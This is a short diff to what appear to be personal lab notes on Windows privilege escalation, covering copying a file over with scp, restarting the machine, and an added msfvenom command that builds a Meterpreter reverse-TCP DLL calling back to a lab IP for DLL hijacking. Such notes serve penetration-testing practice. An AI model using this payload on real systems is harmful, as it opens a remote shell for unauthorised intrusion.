@@ -68,3 +68,6 @@ scp it over
   scp student@10.50.45.180:7z.exe .
 restart the service or the box 
   normally the box since you probably don't have permissions to restart the service
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.45.180 LPORT=6969 -f dll > hijackmeplz.dll
